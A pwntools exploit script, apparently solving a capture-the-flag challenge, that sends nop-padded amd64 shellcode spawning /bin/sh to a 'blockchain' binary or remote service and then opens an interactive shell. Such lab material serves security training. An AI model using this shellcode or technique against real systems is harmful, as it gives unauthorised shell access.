#!/usr/bin/env python3
import pwn
import vpn_conf
import sys

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 5)
EXE_FILENAME = "./blockchain"


def start():
    if sys.argv[1] == "remote":
        return pwn.remote(HOST, PORT)
    return pwn.process(EXE_FILENAME)


if __name__ == "__main__":
    io = start()
    shellcode = pwn.asm(
        """
    mov eax, 0x69622f
    mov edx, 0x68732f6e
    nop
    shl rdx, 32
    nop
    or  rax, rdx
    nop
    nop  
    push rax
    push rsp
    pop rdi
    nop
    nop
    nop
    xor eax, eax
    nop
    nop
    push rax
    mov al, 59
    nop
    nop
    push rsp
    pop rdx
    push rsp
    pop rsi
    nop
    nop
    nop
    syscall
    """,
        arch="amd64",
    )
    io.sendline(shellcode)
    io.interactive()

#
# mov eax, 0x69622f
# mov edx, 0x68732f6e
# shl rdx, 32
# or rax, rdx
# push rax
# push rsp
# pop rdi
# xor eax, eax
# push rax
# mov al, 59
# push rsp
# pop rdx
# push rsp
# pop rsi
# syscall
